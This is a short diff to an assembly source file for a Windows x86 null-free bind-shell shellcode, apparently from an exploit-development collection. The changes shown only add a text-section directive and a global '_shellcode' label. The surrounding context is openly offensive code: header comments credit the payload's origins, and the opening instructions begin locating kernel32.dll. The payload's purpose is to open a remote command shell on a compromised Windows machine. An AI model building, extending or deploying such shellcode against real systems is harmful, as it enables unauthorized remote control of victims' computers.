@@ -1,4 +1,5 @@
 BITS 32
+SECTION .text
 ; Windows x86 null-free bindshell for Windows 5.0-7.0 all service packs.
 ; (See http://skypher.com/wiki/index.php/Hacking/Shellcode/Bind/NGS).
 ; Based largely on code and ideas (C) 2005 by Dafydd Stuttard, NGS Software.
@@ -46,6 +47,8 @@ offset_accept_in_hash_table             equ 6
 %define W2DW(w1,w2)                     (((w2) << 16) + (w1))
 %define B2DW(b1,b2,b3,b4)               (((b4) << 24) + ((b3) << 16) + ((b2) << 8) + (b1))
 
+global _shellcode
+_shellcode:
 start:
     XOR     ECX, ECX                    ; ECX = 0
 ; Find base address of kernel32.dll. This code should work on Windows 5.0-7.0
